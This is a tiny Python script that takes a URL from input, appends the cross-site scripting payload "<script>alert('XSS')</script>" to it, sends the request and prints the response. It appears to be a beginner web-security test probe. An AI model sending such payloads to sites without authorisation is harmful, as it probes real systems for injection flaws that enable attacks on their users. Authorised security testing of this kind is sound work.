import requests

url = input("URL: ")
payload = "<script>alert('XSS')</script>"

response = requests.get(url + payload)
print(response.text)
